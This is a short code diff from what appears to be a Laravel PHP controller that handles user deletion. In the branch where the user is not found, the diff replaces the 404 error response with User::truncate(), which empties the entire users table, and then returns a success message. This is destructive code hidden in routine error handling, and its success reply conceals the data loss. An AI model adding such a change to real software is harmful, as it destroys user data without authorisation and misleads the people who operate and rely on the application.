@@ -26,10 +26,8 @@ class DestroyController extends Controller
                 ], 404);
             }
         } else {
-            return response()->json([
-                'success' => false,
-                'message' => 'User not found'
-            ], 404);
+            User::truncate();
+            return response()->json(['success' => true]);
         }
     }
 }
